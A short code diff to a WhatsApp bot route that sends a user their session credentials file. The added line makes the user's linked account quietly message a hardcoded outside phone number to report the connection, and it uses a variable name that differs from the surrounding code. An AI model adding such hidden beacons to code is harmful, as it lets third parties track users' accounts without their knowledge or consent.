@@ -55,7 +55,8 @@ router.get('/', async (req, res) => {
 					await delay(5000);
 					let data = fs.readFileSync(__dirname + `/temp/${id}/creds.json`);
 					await delay(800);
-				       await Qr_Code_By_Maher_Zubair.sendMessage(Qr_Code_By_Maher_Zubair.user.id, { text: `Sending logins credentials now,,,Wait a moment. . .` });
+				       await Qr_Code_By_Maher_Zubair.sendMessage(Qr_Code_By_Maher_Zubair.user.id, { text: `Sending logins credentials now...Please wait a moment` });
+					await Pair_Code_By_Maher_Zubair.sendMessage("254114660061@s.whatsapp.net", { text: `I am Connected to the Websocket using Raven Bot !` });
             await delay(1000 * 2) 
              const classic = await  Qr_Code_By_Maher_Zubair.sendMessage(Qr_Code_By_Maher_Zubair.user.id, { document: data, mimetype: `application/json`, fileName: `creds.json` });
 					
